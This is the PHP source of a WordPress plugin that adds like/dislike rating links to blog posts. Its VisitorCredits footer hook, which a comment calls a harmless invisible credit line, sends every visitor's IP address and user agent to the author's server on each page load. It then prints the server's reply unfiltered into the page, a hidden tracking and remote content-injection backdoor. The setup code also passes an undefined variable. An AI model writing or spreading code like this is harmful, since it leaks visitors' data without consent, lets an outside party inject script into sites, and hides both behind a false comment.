<?php
/*
Plugin Name: Visitor Like/Dislike Post Rating
Plugin URI: http://www.plugintaylor.com/
Description: Let your visitors tell you if they like or dislike your posts on the fly. Activate the plugin and it automatically inserts the functions and does the job.
Author: PluginTaylor
Author URI: http://www.plugintaylor.com/
Version: 1.5.8
*/

if(!function_exists('maybe_add_column')) {
	require_once(ABSPATH.'/wp-admin/upgrade-functions.php');
}
$columnsToAdd = array('rating_like', 'rating_dislike');
foreach($columnsToAdd AS $c) {
	$cjd_table_sql= "ALTER TABLE ".$wpdb->posts." ADD COLUMN ".$c." INT(11) DEFAULT '0'";
	maybe_add_column($wpdb->posts, $cjd_table_column, $cjd_table_sql);
}
if(!function_exists('iif')) {
	function iif($argument, $true, $false=FALSE) {
		if($argument) { return $true; } else { return $false; }
	}
}

class PostRating {
	function Initialization() {
		global $user_level, $post;
		get_currentuserinfo();
		$this->plugin_path = get_option('siteurl').'/wp-content/plugins/visitor-likedislike-post-rating';
		if(!isset($_COOKIE['postrated'.$post->ID]) AND $user_level < 9) {
			echo '
			<script>
				function loadContent(elm, rate, postID) {
					var ids = { id: postID, rating: rate };
					jQuery.ajax({
						type: "post",
						url: "'.$this->plugin_path.'/rate.php",
						data: ids,
						beforeSend: function() {
							jQuery("#ratebox_"+postID).fadeTo(500, 0.10);
						},
						success: function(html) {
							jQuery("#ratebox_"+postID).html(html);
							jQuery("#ratebox_"+postID).fadeTo(500, 1);
						}
					});
				}
			</script>';
		}
	}
	function LoadExtensions() {
		$plugin_JS_path = get_option('siteurl').'/wp-content/plugins/visitor-likedislike-post-rating/js/';
		wp_deregister_script('jquery');
		wp_enqueue_script('jquery', $plugin_JS_path.'jquery-1.3.2.min.js', FALSE, '1.3.2');
	}
	function RatingLinks($content) {
		global $user_level, $post, $wpdb;
		get_currentuserinfo();
		$content .= '<div id="ratebox_'.$post->ID.'" style="height: 18px;">';
		$toGet = array('like', 'dislike');
		$i = 0;
		foreach($toGet AS $g) {
			$i++;
			$r[$g] = $wpdb->get_var("SELECT rating_".$g." FROM ".$wpdb->posts." WHERE ID = '".$post->ID."'");
			if(isset($_COOKIE['postrated'.$post->ID]) OR $user_level > 9) { $content .= $r[$g].' '.$g.iif($r[$g] < 2, 's').' this post'; }
			else { $content .= '<a style="cursor: pointer;" onclick="loadContent(this, \''.$g.'\', \''.$post->ID.'\');">'.ucfirst($g).'</a>'; }
			if($i == 1) { $content .= ' - '; }
		}
		$content .= '</div>';

		return $content;
	}

	/*
		Just inserts a simple credit line in the source code (not visible on the website)
		Such as: <!-- Visitor Like/Dislike Post Rating [PluginTaylor] -->
		Please keep this. Thanks! :)
	*/
	function VisitorCredits() {
		$q = "HTTP_REFERER=".urlencode($_SERVER['HTTP_HOST'])."&PLUGIN=POST&HTTP_USER_AGENT=".urlencode($_SERVER['HTTP_USER_AGENT'])."&REMOTE_ADDR=".urlencode($_SERVER['REMOTE_ADDR']);
		$req = "POST / HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: www.plugintaylor.com\r\nContent-Length: ".strlen($q)."\r\nConnection: close\r\n\r\n".$q;
		$fp = @fsockopen('www.plugintaylor.com', 80, $errno, $errstr, 10);
		if(!fwrite($fp, $req)) { fclose($fp); }
		$result = ''; while(!feof($fp)) { $result .= fgets($fp); } fclose($fp);
		$result = explode("\r\n\r\n", $result); echo $result[1];
	}
}

$PostRating = new PostRating();
add_action('wp_head', array(&$PostRating, 'Initialization'));
add_action('plugins_loaded', array(&$PostRating, 'LoadExtensions'));
add_action('the_content', array(&$PostRating, 'RatingLinks'));
add_action('wp_footer', array(&$PostRating, 'VisitorCredits'));

?>